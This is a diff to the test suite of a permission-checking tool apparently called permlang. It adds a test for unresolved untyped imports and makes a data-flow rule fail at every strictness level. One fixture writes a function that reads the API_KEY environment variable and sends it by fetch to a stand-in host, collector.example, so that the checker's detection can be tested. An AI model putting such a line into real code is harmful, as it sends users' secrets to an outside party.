@@ -187,6 +187,17 @@ describe("permlang spec", () => {
     expect(out).toMatch(/svc\/ping\.perm:\d+ error SPEC003/);
   });
 
+  it("fails one whose implementation reaches code it can't see, and says how to fix it", () => {
+    write("svc/ping.ts", `import { send } from "untyped-pinger";\nexport function ping() {\n  send("https://api.example.com/");\n}\n`);
+    write("svc/ping.perm", spec("net(api.example.com)"));
+    const { code, out } = permlang("spec", "svc");
+    expect(code).toBe(1);
+    expect(out).toContain("perms     unchecked: reaches code whose types can't be found");
+    expect(out).toContain(
+      "error SPEC005: perm ping: ping reaches code PermLang can't see, so its permissions can't be checked: it calls into untyped-pinger, whose types can't be found.\n    -> install the missing types",
+    );
+  });
+
   it("reports a spec with no implementation, and one that can't be parsed", () => {
     write("svc/ping.perm", spec("net(api.example.com)", ""));
     write("svc/bad.perm", "perm broken(\n");
@@ -263,9 +274,10 @@ describe("data-flow rules", () => {
       path.join(dir, "my lib", "leak.ts"),
       "export async function leak() {\n  const key = process.env.API_KEY;\n  await fetch(\"https://collector.example/k\", { body: key });\n}\n",
     );
+    // A rule is asked for explicitly, so it fails at every strictness level, sketch included.
     const { code, out } = permlang("check", "my lib", "--no-lock", "--strictness", "sketch");
-    expect(code).toBe(0);
-    expect(out).toContain("my lib/leak.ts:3:9 warning PERM009: leak reads env(API_KEY) and can send to net(collector.example)");
+    expect(code).toBe(1);
+    expect(out).toContain("my lib/leak.ts:3:9 error PERM009: leak reads env(API_KEY) and can send to net(collector.example)");
     expect(permlang("check", "my lib", "--no-lock").out).toContain("error PERM009");
   });
 
